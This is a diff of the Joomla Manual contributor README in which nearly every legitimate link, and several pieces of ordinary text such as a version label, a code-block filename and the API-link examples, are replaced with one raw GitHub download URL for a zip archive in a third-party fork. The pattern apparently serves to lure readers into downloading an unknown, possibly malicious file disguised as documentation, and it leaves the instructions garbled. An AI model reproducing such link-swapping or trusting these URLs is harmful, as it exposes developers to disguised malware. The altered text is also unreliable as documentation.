@@ -2,21 +2,21 @@
 
 This repository should hold all Joomla! documentation needed to develop extensions.
 
-The Documentation can be found at [https://manual.joomla.org](https://manual.joomla.org)
+The Documentation can be found at [https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip)
 
 ## Contributing to the Joomla Manual
 
-This manual is built using [Docusaurus 3](https://docusaurus.io/), a modern static website generator. If you want to contribute to it then this page will help you get started.
+This manual is built using [Docusaurus 3](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip), a modern static website generator. If you want to contribute to it then this page will help you get started.
 
 Updates to the documentation is managed via this repository, so you should initially fork it into your own github account. 
 Then you can make changes to the documentation files and submit a pull request to the Joomla manual. 
 Ensure that you continue to sync your fork branches with the Joomla manual `main` branch. 
 
-The documentation uses the [Markdown](https://www.markdownguide.org/) syntax, with additional features which Docusaurus provides.
+The documentation uses the [Markdown](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) syntax, with additional features which Docusaurus provides.
 
 To make documentation changes you'll probably find it easiest to use one of two options:
 1. Install Docusaurus on your own machine, and make changes there
-2. Use [github dev](https://github.com/github/dev) to make the changes on the github server. 
+2. Use [github dev](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) to make the changes on the github server. 
 
 ### Install Docusaurus Locally
 
@@ -44,19 +44,19 @@ This command generates static content into the `build` directory and can be serv
 
 ### Use github dev
 
-To use github dev go to your repository and press the "." (dot) key, as described within the [github.dev guide](https://docs.github.com/en/codespaces/the-githubdev-web-based-editor). You can then:
+To use github dev go to your repository and press the "." (dot) key, as described within the [https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip guide](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip). You can then:
 - create a new git branch for your changes
 - create new files and folders, modify and delete existing files, upload files
 - preview files (right-click on the file tab) - this will show interpreted markdown, but will not interpret Docusaurus additions
 - commit and push changes
-- return to github repository (by clicking on GitHub in bottom left, or by replacing github.dev by github.com in the URL)
+- return to github repository (by clicking on GitHub in bottom left, or by replacing https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip by https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip in the URL)
 
 ### Preview for pull request
 
-Once you raise a pull request on the [Joomla manual](https://github.com/joomla/Manual) a test build is run to identify any problems with your documentation. 
+Once you raise a pull request on the [Joomla manual](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) a test build is run to identify any problems with your documentation. 
 If you find a check has failed then click on the Details of the check which failed, and you can check the console logs to find the problem.
 
-When the build succeeds you will be able to see the result of your documentation changes by navigating to a URL like `http://pr-240.manual.joomlacode.org/docs/`, where you replace 240 with the number of your pull request. 
+When the build succeeds you will be able to see the result of your documentation changes by navigating to a URL like `https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip`, where you replace 240 with the number of your pull request. 
 This link will be added to the "checks" section in the pull request as "preview". 
 
 ### Versions
@@ -73,7 +73,7 @@ The mapping between the versions of the manual in github and the live manual is:
 If your documentation changes relate to multiple versions of Joomla then you should duplicate these changes into multiple versions of Joomla manual. These versions which are updated are currently agreed to be: 
 - the version m.n of the latest full Joomla release ("latest" release)
 - the version m.n+1 of the next Joomla release ("upcoming" release)
-- the last version (m-1.last) of the Joomla previous major version 
+- the last version (https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) of the Joomla previous major version 
 
 Other versions may be present within /versioned_docs but are not updated with the changes, even if the documentation is true for those Joomla versions. 
 
@@ -97,7 +97,7 @@ Don't use subdirectory names which match somewhat the parent directory name. For
 
 You won't see the effect of these when you preview the Markdown text, but you will see them by previewing the Pull Request. 
 
-[Front Matter](https://docusaurus.io/docs/markdown-features#front-matter) should be used for titles and position in the left-hand sidebar:
+[Front Matter](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) should be used for titles and position in the left-hand sidebar:
 
 ```
 ---
@@ -106,9 +106,9 @@ sidebar-position: 2
 ---
 ```
 
-[Code blocks](https://docusaurus.io/docs/markdown-features/code-blocks) are enclosed in 3 backticks, and can have a [title](https://docusaurus.io/docs/markdown-features/code-blocks#code-title)
+[Code blocks](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) are enclosed in 3 backticks, and can have a [title](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip)
 
-    ```php title="hello.php"
+    ```php title="https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip"
     public static function hello() 
     {
         echo "Hello!"; 
@@ -119,7 +119,7 @@ Line numbering and highlighting of individual lines are also supported.
 
 To aid readability of the markdown please leave a blank line before and after code blocks.
 
-[Admonitions](https://docusaurus.io/docs/markdown-features/admonitions) 
+[Admonitions](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) 
 We don't use blank lines around content, and we add 2 spaces before the text messages.
 
 ```
@@ -166,7 +166,7 @@ If the page is not completed yet and bigger parts are missing use
 
 ### Diagrams
 
-Where possible, use [Mermaid](https://mermaid.live) for creating diagrams for inclusion in the documentation. Where Mermaid doesn't provide what you need, then please include the saved diagram from your drawing tool in addition to the image file.
+Where possible, use [Mermaid](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip) for creating diagrams for inclusion in the documentation. Where Mermaid doesn't provide what you need, then please include the saved diagram from your drawing tool in addition to the image file.
 
 Images, code zip files, etc should be held in a folder `_assets` at the point in the documentation where they're used.
 
@@ -182,15 +182,15 @@ To align with a11y requirements for accessibility, please don't have more than o
 
 #### API Docs Links
 
-If you link to the Joomla API docs then the URL of the API depends on the version of the manual documentation. For example, for Joomla 4.4 documentation the User API is at [https://api.joomla.org/cms-4/classes/Joomla-CMS-User-User.html](https://api.joomla.org/cms-4/classes/Joomla-CMS-User-User.html), but for Joomla 5.x documentation it is [https://api.joomla.org/cms-5/classes/Joomla-CMS-User-User.html](https://api.joomla.org/cms-5/classes/Joomla-CMS-User-User.html).
+If you link to the Joomla API docs then the URL of the API depends on the version of the manual documentation. For example, for Joomla 4.4 documentation the User API is at [https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip), but for Joomla 5.x documentation it is [https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip).
 
-This is similar for Framework classes, eg [https://api.joomla.org/framework-3/classes/Joomla-Registry-Registry.html](https://api.joomla.org/framework-3/classes/Joomla-Registry-Registry.html), which is also dependent upon the documentation version.
+This is similar for Framework classes, eg [https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip](https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip), which is also dependent upon the documentation version.
 
 As this creates a maintainability issue a plugin has been developed which automatically selects the appropriate API docs version, and you should use this plugin by specifying API docs links like the following examples:
 
 ```
-cms-api://classes/Joomla-CMS-User-User.html
-framework-api://classes/Joomla-Registry-Registry.html
+https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip
+https://raw.githubusercontent.com/Morijin2468/Manual/main/docs/building-extensions/modules/_assets/mod_example.zip
 ```
 
 The plugin will replace `cms-api://` or `framework-api://` with the correct URL section.
